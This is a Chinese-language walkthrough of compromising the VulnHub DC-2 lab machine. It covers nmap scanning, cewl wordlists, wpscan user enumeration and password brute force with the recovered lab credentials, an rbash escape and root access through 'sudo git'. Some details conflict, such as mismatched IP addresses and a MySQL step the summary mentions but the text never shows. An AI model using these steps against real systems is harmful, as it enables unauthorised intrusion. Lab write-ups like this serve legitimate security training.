## vulnhub之DC-2靶机渗透详细过程

    
    
    nmap 192.168.26.0/24
    

发现靶机IP：192.168.26.130

kali IP：192.16826.20

    
    
    nmap -sS -sV -T4 -A -p- 192.168.26.130
    

访问其80端口发现不解析，

![图片.png](https://image.3001.net/images/20220123/1642869305_61ec323958103c5f557b8.png!small)

发现80端口开启，打开浏览器输入ip访问，发现页面无法加载，添加本地DNS解析：

    
    
    vim /etc/hosts
    

添加192.168.159.139 DC-2

![图片.png](https://image.3001.net/images/20220123/1642869314_61ec3242e15d0d214d5fb.png!small)

![图片.png](https://image.3001.net/images/20220123/1642869321_61ec32495671748a1b703.png!small)

访问网站，发现发现flag1，提示cewl，搜索cewl发现是kali自带的一个密码字典生成工具。

使用cewl 访问该网站，并将生成的字典写入到dc2_passwords.txt

    
    
    cewl -w dc2_passwords.txt http://dc-2
    

使用wpscan发现了三个用户

    
    
    wpscan --ignore-main-redirect --url 192.168.26.130 --enumerate u --force
    

![图片.png](https://image.3001.net/images/20220123/1642869334_61ec3256f3013a174687a.png!small)

#### 通过已经扫描到的用户名和cewl生成的密码字典对目标主机（dc-2）进行爆破

    
    
    wpscan --ignore-main-redirect --url 192.168.26.130 -U dc-2_user.txt -P dc2_passwords.txt --force
    

![图片.png](https://image.3001.net/images/20220123/1642869353_61ec326943450fe6adb20.png!small)

    
    
    Username：tom         					Password：parturient
    Username：jerry						    Password：adipiscing
    

成功获得tom 和jerry的密码，尝试使用ssh登录，发现tom用户可以使用ssh登录，使用以下命令，并输入tom的密码即可登录tom账号

    
    
    ssh tom@192.168.26.130 -p 7744
    

登录后我们会发现，我们是一个受限制的shell，有关受限制的shell这里不多说，这里推荐一篇文章大家可以去看看

链接：https://xz.aliyun.com/t/7642#toc-0

![图片.png](https://image.3001.net/images/20220123/1642869362_61ec327278ba5b9553a64.png!small)

接下来我们就需要使用一些方法逃逸出rbash，我们输入以下两条命令来逃逸出这个受限制的shell

    
    
    BASH_CMDS[a]=/bin/sh;a
     /bin/bash
    

执行完这两条命令后我们再执行下面的命令，我们可以发现我们现在的shell不再是-rbash了，变成了正常的bash，但是我们还是无法执行命令，因为我们需要添加环境变量才行。

![图片.png](https://image.3001.net/images/20220123/1642869370_61ec327a49583bc58cd5a.png!small)

我们执行以下命令，添加环境变量

    
    
    命令1：export PATH=$PATH:/bin/
    或者
    命令2：export PATH=/usr/sbin:/usr/bin:/sbin:/bin
    

![图片.png](https://image.3001.net/images/20220123/1642869382_61ec3286c5ab7cc70c8d0.png!small)

接下来切换到jerry用户

    
    
    su  jerry
    cd /home/jerry
    ls
    cat flag4.txt
    

![图片.png](https://image.3001.net/images/20220123/1642869407_61ec329f8145b8bea8891.png!small)

根据flag4的提示信息，明显是要使用git提权

    
    
    find / -user root -perm -4000 -print 2>/dev/null   #发现具有suid权限的命令
    

![图片.png](https://image.3001.net/images/20220123/1642869429_61ec32b525dbd1a7f9441.png!small)

使用命令:sudo -l，查看可以无密码使用root权限的命令，果然是git

![图片.png](https://image.3001.net/images/20220123/1642869440_61ec32c0d50781045f57c.png!small)

    
    
    输入以下命令即可提权成功
    sudo git help config 
    h
    !/bin/bash
    

![图片.png](https://image.3001.net/images/20220123/1642869590_61ec33561e751f572b0da.png!small)  
DC-2靶机到这里就结束了，这里简单总结一下DC-2靶机的考点，首先就是cewl和wpscan工具的使用，其次是mysql数据库的增删改查，然后就是rbash的逃逸以及sudo的提权。总体来讲，我还是通过DC-2靶机学到了一些之前不了解的知识点，例如rbash。

